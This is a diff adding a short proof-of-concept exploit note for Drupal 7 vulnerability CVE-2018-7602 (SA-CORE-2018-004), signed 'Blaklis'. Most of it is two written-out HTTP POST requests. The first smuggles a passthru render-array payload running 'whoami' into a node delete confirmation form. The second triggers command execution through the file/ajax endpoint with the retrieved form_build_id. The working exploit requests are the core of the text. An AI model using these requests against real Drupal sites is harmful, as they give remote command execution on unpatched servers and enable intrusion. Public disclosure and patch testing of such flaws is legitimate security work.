@@ -1,0 +1,18 @@
+This is a sample of exploit for Drupal 7 new vulnerability SA-CORE-2018-004 / CVE-2018-7602.
+
+You must be authenticated and with the power of deleting a node. Some other forms may be vulnerable : at least, all of forms that is in 2-step (form then confirm).
+
+POST /?q=node/99/delete&destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=whoami HTTP/1.1
+[...]
+form_id=node_delete_confirm&_triggering_element_name=form_id&form_token=[CSRF-TOKEN]
+
+Retrieve the form_build_id from the response, and then triggering the exploit with : 
+
+POST /drupal/?q=file/ajax/actions/cancel/%23options/path/[FORM_BUILD_ID] HTTP/1.1
+[...]
+form_build_id=[FORM_BUILD_ID]
+
+This will display the result of the whoami command.
+
+Patch your systems!
+Blaklis
